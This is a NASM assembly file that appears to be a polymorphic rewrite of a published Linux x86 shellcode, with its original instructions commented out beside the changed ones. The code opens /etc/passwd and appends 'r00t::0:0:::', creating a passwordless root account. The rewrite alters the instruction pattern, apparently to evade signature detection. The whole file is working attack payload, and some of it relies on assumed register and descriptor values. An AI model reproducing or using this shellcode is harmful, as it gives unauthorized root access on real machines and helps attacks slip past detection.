;Filename: root_user.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-211.php
;Polymorphic version author: MrSquid

;Original Lenght: 69 bytes 

;Polymorphic version: x bytes

section .text

     global _start

_start:
	; open("/etc//passwd", O_WRONLY | O_APPEND)
	push byte +0x5
	pop eax
	;xor ecx,ecx 		;Original line
	push ecx
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	mov ebx,esp
				;lea ebx,[ebp-44] ;Other version, but the lenght of the shellcode is increased 
	mov cx,0x401
	int 0x80

	; write(ebx, "r00t::0:0:::", 12)
	;mov ebx,eax		;Original line
	push 0x3		;Modified line
	pop ebx			;Modified line
	;push byte +0x4		;Original line
	;pop eax		;Original line
	add eax,1		;Modified line
	;xor edx,edx		;Original line
	;push edx		;Original line
	push eax		;Modified line
	push dword 0x3a3a3a30
	push dword 0x3a303a3a
	push dword 0x74303072
	mov ecx,esp
				;lea ecx,[ebp-60] ;If we want to modify more the code, but the lenght of the shellcode is increased
	push byte +0xc
	pop edx
	int 0x80

	; close(ebx)
	;push byte +0x6		;Original line
	;pop eax		;Original line
	add ebx,3		;Modified line
	mov eax,ebx	
	int 0x80

	; exit()
	push byte +0x1
	pop eax
	int 0x80

